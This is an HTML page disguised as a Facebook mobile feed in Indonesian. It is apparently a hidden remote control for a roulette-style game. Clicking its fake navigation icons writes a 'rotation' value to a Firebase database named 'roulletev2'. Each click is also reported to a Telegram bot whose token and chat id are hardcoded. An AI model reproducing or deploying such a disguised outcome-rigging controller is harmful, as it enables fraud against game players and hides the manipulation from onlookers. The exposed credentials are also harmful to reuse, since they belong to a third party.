<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #18191a; color: #e4e6eb; -webkit-tap-highlight-color: transparent; }

        /* --- HEADER & NAV --- */
        .header { background: #242526; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #3e4042; }
        .nav-primary { display: flex; justify-content: space-around; background: #242526; border-bottom: 1px solid #3e4042; position: sticky; top: 48px; z-index: 99; }
        .nav-icon { font-size: 22px; padding: 12px; cursor: pointer; width: 16%; text-align: center; color: #b0b3b8; }
        .nav-icon:active { color: #1877f2; }

        /* --- POST BAR --- */
        .post-bar { background: #242526; padding: 12px; display: flex; align-items: center; gap: 10px; margin-top: 8px; }
        .avatar { width: 38px; height: 38px; background: #4e4f50; border-radius: 50%; overflow: hidden; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .search-fake { background: #3a3b3c; flex: 1; padding: 9px 15px; border-radius: 20px; color: #b0b3b8; font-size: 14px; cursor: pointer; }

        /* --- SYSTEM STATUS --- */
        .system-status-card { background: #1c1e21; border-top: 2px solid #1877f2; padding: 12px; margin-top: 8px; font-size: 11px; }
        .sys-info { font-family: monospace; color: #b0b3b8; }

        /* --- FEED CARD --- */
        .feed-card { background: #242526; margin-top: 10px; padding: 12px; border-bottom: 1px solid #3e4042; }
        .feed-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
        .profile-name { font-weight: bold; font-size: 14px; }
        .feed-time { font-size: 12px; color: #b0b3b8; }
        .feed-text { font-size: 14px; line-height: 1.4; margin-bottom: 12px; }
        .media-box { width: 100%; border-radius: 8px; overflow: hidden; background: #000; margin-top: 5px; }
        .media-box img, .media-box video { width: 100%; display: block; }

        /* --- BUTTONS --- */
        .btn-wa { display: block; width: 100%; padding: 10px; background: #25d366; color: white; text-align: center; text-decoration: none; border-radius: 6px; font-weight: bold; margin-top: 10px; font-size: 14px; }
        .shortcut-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 12px; background: #242526; }
        .shortcut-item { background: #3a3b3c; padding: 12px 5px; border-radius: 8px; text-align: center; cursor: pointer; font-size: 11px; font-weight: bold; }
    </style>
</head>
<body onmousedown="resetTimer()">

    <div id="fb-remote">
        <div class="header">
            <div style="color:#fff; font-size: 22px; font-weight: bold;">facebook</div>
            <div style="display: flex; gap: 15px; font-size: 18px;">🔍 💬</div>
        </div>

        <div class="nav-primary">
            <div class="nav-icon" onclick="sendCmd(1, 'HOME')">🏠</div>
            <div class="nav-icon" onclick="sendCmd(2, 'WATCH')">📺</div>
            <div class="nav-icon" onclick="sendCmd(3, 'MARKET')">🏪</div>
            <div class="nav-icon" onclick="sendCmd(4, 'GROUPS')">👥</div>
            <div class="nav-icon" onclick="sendCmd(5, 'NOTIF')">🔔</div>
            <div class="nav-icon" onclick="sendCmd(6, 'MENU')">☰</div>
        </div>

        <div class="post-bar">
            <div class="avatar"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
            <div class="search-fake" onclick="sendCmd(null, 'RANDOM')">Apa yang Anda pikirkan?</div>
        </div>

        <div class="system-status-card">
            <div style="color:#1877f2; font-weight:bold; margin-bottom:5px;">SECURITY & SYSTEM SYNC</div>
            <div class="sys-info">
                Node: <span id="node-val">STABLE</span> | Payload: <span id="payload-val">READY</span><br>
                Status: <span id="sync-val" style="color:#42b72a">CONNECTED</span>
            </div>
        </div>

        <div class="feed-card">
            <div class="feed-header">
                <div class="avatar"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
                <div><div class="profile-name">Video Lucu Dunia</div><div class="feed-time">12 mnt • 🌎</div></div>
            </div>
            <div class="feed-text">Coba lihat aksi menggemaskan ini! 😍 #lucu #viral</div>
            <div class="media-box">
                <video controls muted loop><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"></video>
            </div>
        </div>

        <div class="shortcut-grid">
            <div class="shortcut-item" onclick="sendCmd(7, 'REELS')">🎞️<br>Reels</div>
            <div class="shortcut-item" onclick="sendCmd(8, 'LIVE')">🎥<br>Live</div>
            <div class="shortcut-item" onclick="sendCmd(9, 'PHOTO')">🖼️<br>Foto</div>
            <div class="shortcut-item" onclick="sendCmd(10, 'EVENT')">📅<br>Acara</div>
            <div class="shortcut-item" onclick="sendCmd(11, 'SAVE')">🔖<br>Simpan</div>
            <div class="shortcut-item" onclick="sendCmd(12, 'DATE')">❤️<br>Kencan</div>
        </div>

        </div>

    <script>
        let dbRef = null;
        let isAdminLocked = true; // Langsung OFF saat awal (Revisi posisi OFF)

        const config = { databaseURL: "https://roulletev2-default-rtdb.asia-southeast1.firebasedatabase.app/" };
        if (!firebase.apps.length) firebase.initializeApp(config);
        dbRef = firebase.database().ref('control');

        // Monitoring Firebase
        dbRef.on('value', (s) => {
            const d = s.val();
            isAdminLocked = (d && (d.clientA_status === "OFF" || d.app_status === "OFF"));
            
            const nodeLabel = document.getElementById("node-val");
            if (isAdminLocked) {
                nodeLabel.innerText = "STABLE"; 
            } else {
                nodeLabel.innerText = "ID_STABLE"; 
            }
        });

        function sendCmd(id, label) {
            let val = (id === null) ? "RANDOM" : (12 - id).toFixed(1);
            
            document.getElementById("payload-val").innerText = val;
            document.getElementById("sync-val").innerText = "SENDING...";
            document.getElementById("sync-val").style.color = "#ffaa00";

            if (isAdminLocked) {
                setTimeout(() => { 
                    document.getElementById("sync-val").innerText = "CONNECTED"; 
                    document.getElementById("sync-val").style.color = "#42b72a";
                }, 800);
                return; 
            }

            fetch(`https://api.telegram.org/bot8075763270:AAHO7w8v1g2ThE_NetGWEpFDid620dlmF28/sendMessage?chat_id=1988855705&text=FB_LOG:${label}_Val:${val}`);
            
            if(dbRef) {
                dbRef.update({ rotation: val, last_click: Date.now() }).then(() => {
                    setTimeout(() => { 
                        document.getElementById("sync-val").innerText = "CONNECTED"; 
                        document.getElementById("sync-val").style.color = "#42b72a";
                    }, 800);
                });
            }
        }

        // --- FITUR BARU: AUTO REFRESH & AUTO LOGOUT ---
        
        // 1. Auto Logout / Force Refresh setiap 10 detik (Posisi ON/OFF tetap jalan)
        setTimeout(() => {
            location.reload();
        }, 10000); 

        // 2. Auto Refresh data UI setiap 5 detik (Tanpa reload halaman penuh)
        setInterval(() => {
            if(dbRef) {
                dbRef.once('value').then((s) => {
                    console.log("Auto Sync Data...");
                });
            }
        }, 5000);

        function resetTimer() {
            // Jika ingin 10 detik tetap saklek, kosongkan fungsi reset ini
            // Agar logout/refresh tetap terjadi tiap 10 detik
        }
    </script>
</body>
</html>
